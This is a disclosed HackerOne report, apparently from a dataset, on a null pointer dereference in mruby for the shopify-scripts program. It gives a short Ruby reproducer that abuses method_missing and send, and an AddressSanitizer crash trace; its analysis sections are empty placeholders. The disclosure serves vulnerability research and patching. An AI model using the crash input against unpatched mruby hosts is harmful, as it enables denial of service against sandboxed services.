---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '242354'
original_report_id: '242354'
title: Null pointer dereference with send/method_missing
weakness: NULL Pointer Dereference
team_handle: shopify-scripts
created_at: '2017-06-22T14:38:45.944Z'
disclosed_at: '2017-06-23T17:12:50.311Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- null-pointer-dereference
---

# Null pointer dereference with send/method_missing

## Metadata

- HackerOne Report ID: 242354
- Weakness: NULL Pointer Dereference
- Program: shopify-scripts
- Disclosed At: 2017-06-23T17:12:50.311Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The following program triggers a null pointer dereference with mruby b200c747:

```ruby
def method_missing(m)
ensure
begin A rescue
break
rescue
end
end

send ''
```

ASAN report:

```text
ASAN:DEADLYSIGNAL
=================================================================
==12116==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000051bfaa bp 0x7fff4a650cd0 sp 0x7fff4a648a80 T0)
    #0 0x51bfa9 in mrb_vm_exec /home/vagrant/mruby/src/vm.c:1427:9
    #1 0x510c6a in mrb_vm_run /home/vagrant/mruby/src/vm.c:879:12
    #2 0x541b3f in mrb_top_run /home/vagrant/mruby/src/vm.c:2884:12
    #3 0x6569ff in mrb_load_exec /home/vagrant/mruby/mrbgems/mruby-compiler/core/parse.y:5823:7
    #4 0x657685 in mrb_load_file_cxt /home/vagrant/mruby/mrbgems/mruby-compiler/core/parse.y:5832:10
    #5 0x4f3a61 in main /home/vagrant/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227:11
    #6 0x7f256672ef44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21f44)
    #7 0x41a5c5 in _start (/home/vagrant/mruby/bin/mruby+0x41a5c5)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/vagrant/mruby/src/vm.c:1427:9 in mrb_vm_exec
==12116==ABORTING
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
